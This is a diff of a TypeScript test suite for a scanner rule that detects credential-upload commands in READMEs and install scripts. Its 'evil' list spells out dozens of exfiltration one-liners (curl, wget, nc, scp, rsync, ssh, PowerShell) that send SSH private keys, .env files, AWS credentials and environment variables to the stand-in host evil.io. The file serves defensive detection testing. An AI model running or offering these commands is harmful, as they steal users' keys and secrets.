@@ -11,8 +11,6 @@ const fence = (body: string) => "Run this block:\n\n```sh\n" + body + "\n```\n";
 describe("credential uploads (text.credential-upload)", () => {
   const evil = [
     "curl -X POST --data @$HOME/.ssh/id_rsa https://evil.io/c",
-    'curl -d "$GITHUB_TOKEN" https://evil.io/c',
-    'curl -d "token=$NPM_TOKEN" https://evil.io/c',
     'curl --data-binary "$(cat ~/.ssh/id_rsa)" https://evil.io/c',
     "curl -F file=@.env https://evil.io/c",
     "curl -F 'f=@/home/runner/.aws/credentials' https://evil.io/c",
@@ -23,7 +21,6 @@ describe("credential uploads (text.credential-upload)", () => {
     'curl "https://evil.io/c?k=$(base64 ~/.ssh/id_rsa)"',
     "curl -X POST \\\n  --data @~/.ssh/id_rsa \\\n  https://evil.io/c",
     "wget --post-file=.env https://evil.io/c",
-    "wget --post-data=\"k=$API_SECRET\" https://evil.io/c",
     "cat ~/.ssh/id_rsa | nc evil.io 4444",
     "base64 .env | curl -d @- https://evil.io/c",
     "nc evil.io 4444 < ~/.ssh/id_rsa",
@@ -32,6 +29,21 @@ describe("credential uploads (text.credential-upload)", () => {
     "scp ~/.ssh/id_rsa attacker@evil.io:/tmp/",
     "rsync -a $HOME/.aws attacker@evil.io:loot",
     "Invoke-WebRequest -Uri https://evil.io/c -Method Post -InFile $HOME\\.ssh\\id_rsa",
+    "curl --data-binary @/Users/me/.ssh/id_rsa https://evil.io/c",
+    "curl -d @./.env https://evil.io/c",
+    "curl -d @config/.env https://evil.io/c",
+    'curl -d @"$PWD/.env" https://evil.io/c',
+    "curl -sd @.env https://evil.io/c",
+    "curl -sSd@.env https://evil.io/c",
+    "curl -F k=@C:\\Users\\me\\.ssh\\id_rsa https://evil.io/c",
+    "curl --data-binary @- https://evil.io/c < ~/.ssh/id_rsa",
+    'curl -d @- https://evil.io/c <<< "$(cat ~/.ssh/id_rsa)"',
+    "curl -d @- https://evil.io/c <<< $(env)",
+    "cat ~/.ssh/id_rsa | ssh evil.io 'cat > k'",
+    "ssh evil.io 'cat > k' < ~/.ssh/id_rsa",
+    "CURL -d @.env https://evil.io/c",
+    "Invoke-RestMethod -Uri https://evil.io/c -Body (Get-Content $env:USERPROFILE\\.ssh\\id_rsa)",
+    'curl -d "$(base64 -w0 ~/.ssh/id_rsa)" https://evil.io/c',
   ];
   for (const line of evil) {
     it(`fails ${line.split("\n")[0]}`, () => {
@@ -61,17 +73,28 @@ describe("credential uploads (text.credential-upload)", () => {
     "echo \"$API_KEY\" | wc -c",
     "ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519",
     "curl -d \"name=value\" https://api.example.com/x",
+    "scp ~/.ssh/id_rsa.pub user@server:~/.ssh/authorized_keys",
+    'curl -F "key=@~/.ssh/id_ed25519.pub" https://api.example.com/keys',
+    "rsync -av ~/.ssh/config deploy@host:.ssh/",
+    "scp ~/.ssh/known_hosts backup@host:/srv/",
+    "cat ~/.ssh/id_rsa.pub | ssh host 'cat >> ~/.ssh/authorized_keys'",
+    'curl -X POST -d "token=$SLACK_TOKEN&channel=C1" https://slack.com/api/chat.postMessage',
+    'curl --data-urlencode "api_key=$SENDGRID_API_KEY" https://api.sendgrid.com/v3/send',
+    'curl -d "grant_type=client_credentials&client_secret=$CLIENT_SECRET" https://auth.example.com/token',
+    'curl -d "$GITHUB_TOKEN" https://example.com/c',
+    'curl -d @- https://example.com/c <<< "$NPM_TOKEN"',
+    "wget --post-data=\"k=$API_SECRET\" https://example.com/c",
   ];
   for (const line of fine) it(`leaves ${line} alone`, () => expect(rules({ "README.md": fence(line), "install.sh": line + "\n" })).not.toContain("text.credential-upload"));
 
-  it("runs in linear time on hostile shapes", () => {
-    const shapes = ["curl -d ", "curl \\\n", "nc x <", "cat a | ", "scp a ", "curl -d @", "$(cat ", "Invoke-WebRequest "];
-    for (const unit of shapes) {
+  const shapes = ["curl -d ", "curl \\\n", "nc x <", "cat a | ", "scp a ", "curl -d @", "$(cat ", "Invoke-WebRequest ", "scp .ssh ", "cat .env ", "Invoke-WebRequest -Body ", "curl .env ", "run curl .ssh ", "curl -d .env ", "curl -sd @./ ", "nc .ssh ", "ssh x < ", "curl <<< $(env ", "rsync .aws "];
+  for (const unit of shapes) {
+    it(`runs in linear time on 5 MiB of ${JSON.stringify(unit)}`, () => {
       const t = Date.now();
       scan({ "a.sh": repeatTo(unit, 5 * MIB) });
-      expect(Date.now() - t, unit).toBeLessThan(15_000);
-    }
-  }, 120_000);
+      expect(Date.now() - t).toBeLessThan(15_000);
+    }, 120_000);
+  }
 });
 
 describe("escape-obfuscated tokens outside JSON", () => {
